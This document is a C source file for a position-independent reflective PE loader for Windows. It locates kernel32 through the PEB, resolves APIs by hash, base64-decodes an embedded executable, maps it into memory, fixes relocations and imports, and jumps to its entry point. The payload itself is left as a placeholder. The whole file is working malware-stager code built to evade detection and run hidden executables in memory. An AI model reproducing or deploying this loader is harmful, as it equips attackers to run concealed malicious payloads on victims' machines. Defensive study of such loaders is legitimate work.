#include <windows.h>
#include <winternl.h>

// 1. Entry Point MUST BE FIRST IN SOURCE
void Entry();
void LoaderEntry();
unsigned long HashString(const char* str);
unsigned long HashStringW(const WCHAR* str, size_t len);
HMODULE GetModBase(unsigned long hash);
FARPROC GetFuncAddr(HMODULE hMod, unsigned long hash);
int GetB64Val(char c);
size_t B64Decode(const char* in, BYTE* out);
ULONG_PTR GetRIP(void);

__attribute__((section(".text$00"))) void Entry() {
    LoaderEntry();
}

__attribute__((section(".text$01"))) __attribute__((noinline)) ULONG_PTR GetRIP(void) {
    ULONG_PTR ret;
    __asm__ (
        "call 1f\n"
        "1: pop %0\n"
        : "=r"(ret)
    );
    return ret;
}

// Redefine structures for PIC
typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _API_TABLE {
    HMODULE (WINAPI *LoadLibraryA)(LPCSTR);
    FARPROC (WINAPI *GetProcAddress)(HMODULE, LPCSTR);
    LPVOID (WINAPI *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    BOOL (WINAPI *VirtualFree)(LPVOID, SIZE_T, DWORD);
    BOOL (WINAPI *VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
} API_TABLE;

typedef struct _RELOC_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} RELOC_ENTRY, *PRELOC_ENTRY;

__attribute__((section(".text$02"))) void LoaderEntry() {
    API_TABLE api;
    HMODULE hK32 = GetModBase(0x7040ee75); // kernel32.dll
    if (!hK32) return;

    api.LoadLibraryA = (void*)GetFuncAddr(hK32, 0x5fbff0fb);
    api.GetProcAddress = (void*)GetFuncAddr(hK32, 0xcf31bb1f);
    api.VirtualAlloc = (void*)GetFuncAddr(hK32, 0x382c0f97);
    api.VirtualFree = (void*)GetFuncAddr(hK32, 0x69dbd17d);
    api.VirtualProtect = (void*)GetFuncAddr(hK32, 0x10066f1f);

    if (!api.LoadLibraryA || !api.GetProcAddress || !api.VirtualAlloc) return;

    ULONG_PTR rip = GetRIP();
    const char* p = (const char*)rip;
    while (1) {
        if (*(DWORD*)p == 0x3a444c50) break; // "PLD:"
        p++;
    }
    p += 4;

    size_t b64_len = 0;
    while (p[b64_len] != '-' && p[b64_len] != 0) b64_len++;

    BYTE* raw = (BYTE*)api.VirtualAlloc(NULL, b64_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!raw) return;
    size_t raw_len = B64Decode(p, raw);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);

    BYTE* base = (BYTE*)api.VirtualAlloc((LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) base = (BYTE*)api.VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return;

    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++) base[i] = raw[i];
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        BYTE* dest = base + sec[i].VirtualAddress;
        BYTE* src = raw + sec[i].PointerToRawData;
        for (DWORD j = 0; j < sec[i].SizeOfRawData; j++) dest[j] = src[j];
    }

    IMAGE_DATA_DIRECTORY rDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (rDir.Size > 0 && (ULONG_PTR)base != nt->OptionalHeader.ImageBase) {
        ULONG_PTR delta = (ULONG_PTR)(base - nt->OptionalHeader.ImageBase);
        PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(base + rDir.VirtualAddress);
        while (rel->VirtualAddress != 0) {
            DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PRELOC_ENTRY entry = (PRELOC_ENTRY)(rel + 1);
            for (DWORD i = 0; i < count; i++) {
                if (entry[i].Type == IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)(base + rel->VirtualAddress + entry[i].Offset) += delta;
                else if (entry[i].Type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)(base + rel->VirtualAddress + entry[i].Offset) += (DWORD)delta;
            }
            rel = (PIMAGE_BASE_RELOCATION)((BYTE*)rel + rel->SizeOfBlock);
        }
    }

    IMAGE_DATA_DIRECTORY iDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (iDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + iDir.VirtualAddress);
        while (imp->Name != 0) {
            HMODULE hL = api.LoadLibraryA((char*)(base + imp->Name));
            if (hL) {
                PIMAGE_THUNK_DATA th = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
                PIMAGE_THUNK_DATA orig = (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk);
                if (imp->OriginalFirstThunk == 0) orig = th;
                while (orig->u1.AddressOfData != 0) {
                    if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal)) th->u1.Function = (ULONG_PTR)api.GetProcAddress(hL, (LPCSTR)IMAGE_ORDINAL(orig->u1.Ordinal));
                    else th->u1.Function = (ULONG_PTR)api.GetProcAddress(hL, ((PIMAGE_IMPORT_BY_NAME)(base + orig->u1.AddressOfData))->Name);
                    th++; orig++;
                }
            }
            imp++;
        }
    }

    sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD old, prot = PAGE_READONLY;
        if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) prot = PAGE_READWRITE;
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) prot = (prot == PAGE_READWRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        api.VirtualProtect(base + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, prot, &old);
    }

    if (nt->OptionalHeader.AddressOfEntryPoint) ((void(*)())(base + nt->OptionalHeader.AddressOfEntryPoint))();
    api.VirtualFree(raw, 0, MEM_RELEASE);
}

__attribute__((section(".text$03"))) unsigned long HashString(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
    return hash;
}

__attribute__((section(".text$04"))) unsigned long HashStringW(const WCHAR* str, size_t len) {
    unsigned long hash = 5381;
    for (size_t i = 0; i < len; i++) {
        WCHAR c = str[i];
        if (c >= L'A' && c <= L'Z') c += 32;
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

__attribute__((section(".text$05"))) HMODULE GetModBase(unsigned long hash) {
    PPEB peb;
#if defined(_M_X64) || defined(__x86_64__)
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        PMY_LDR_DATA_TABLE_ENTRY entry = (PMY_LDR_DATA_TABLE_ENTRY)((BYTE*)curr - sizeof(LIST_ENTRY));
        if (HashStringW(entry->BaseDllName.Buffer, entry->BaseDllName.Length / sizeof(WCHAR)) == hash) return (HMODULE)entry->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

__attribute__((section(".text$06"))) FARPROC GetFuncAddr(HMODULE hMod, unsigned long hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (HashString((char*)((BYTE*)hMod + names[i])) == hash) return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
    }
    return NULL;
}

__attribute__((section(".text$07"))) int GetB64Val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

__attribute__((section(".text$08"))) size_t B64Decode(const char* in, BYTE* out) {
    size_t i = 0, j = 0;
    while (in[i]) {
        int v1 = GetB64Val(in[i++]);
        int v2 = (in[i]) ? GetB64Val(in[i++]) : -1;
        int v3 = (in[i]) ? GetB64Val(in[i++]) : -1;
        int v4 = (in[i]) ? GetB64Val(in[i++]) : -1;
        if (v1 == -1 || v2 == -1) break;
        out[j++] = (v1 << 2) | (v2 >> 4);
        if (v3 != -1) {
            out[j++] = ((v2 & 0xF) << 4) | (v3 >> 2);
            if (v4 != -1) out[j++] = ((v3 & 0x3) << 6) | v4;
        }
    }
    return j;
}

// 4. PAYLOAD PLACEHOLDER AT THE END
__attribute__((section(".text$zz"))) const char payload_b64[] = "---PAYLOAD_PLACEHOLDER---";
